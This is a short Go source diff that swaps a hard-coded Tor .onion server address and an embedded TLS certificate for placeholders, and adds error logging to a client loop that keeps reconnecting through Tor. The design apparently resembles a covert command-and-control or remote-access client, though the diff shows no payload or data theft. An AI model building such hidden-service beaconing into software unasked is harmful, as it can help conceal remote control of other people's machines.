@@ -12,21 +12,15 @@ import (
 
 const (
 	// serverDomain needs to be changed to your address
-	serverDomain = "onionadresshere.onion"
+	serverDomain = "youronionadresshere.onion"
 	serverPort   = ":1337"
 	serverAddr   = serverDomain + serverPort
 )
 
-// serverCert tls certificate of the server
+// serverCert needs to be changed to the TLS certificate of the server
+// intendation breaks the certificate
 const serverCert = `-----BEGIN CERTIFICATE-----
-MIIBdzCCAR2gAwIBAgIQCJzxHQ+xnScMYFahlDW5fjAKBggqhkjOPQQDAjASMRAw
-DgYDVQQKEwdBY21lIENvMB4XDTE5MDExODAwMDIzMVoXDTIwMDExODAwMDIzMVow
-EjEQMA4GA1UEChMHQWNtZSBDbzBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABHBV
-FZmVFjCiYKpSDtFwESwezOD3hCgBDCsvXYWBEsASGJOVUADh9YS+C4vUj5R8n5RT
-BoS6VS2GINajDSio/VOjVTBTMA4GA1UdDwEB/wQEAwICpDATBgNVHSUEDDAKBggr
-BgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MBsGA1UdEQQUMBKCEHBzZXVkb2hvc3Qu
-b25pb24wCgYIKoZIzj0EAwIDSAAwRQIgJ6Jec8exBiYMeK3LwF2su5OD+6gUJ92b
-h+YOLiNCoB4CIQC+vx3B4RIADu7CTWYH5E1WeRES/zdocTdBgchWozpypw==
+____ CERTIFICATE GOES HERE | DONT INDENT ____
 -----END CERTIFICATE-----`
 
 type connection struct {
@@ -60,10 +54,11 @@ func NetClient() {
 		return
 	}
 	defer t.Close()
-	dialer, err := t.Dialer(nil, nil)
+	dialer, _ := t.Dialer(nil, nil)
 	for {
 		conn, err := connect(dialer)
 		if err != nil {
+			log.Println("Could not connect:", err)
 			time.Sleep(10 * time.Second)
 			continue
 		}
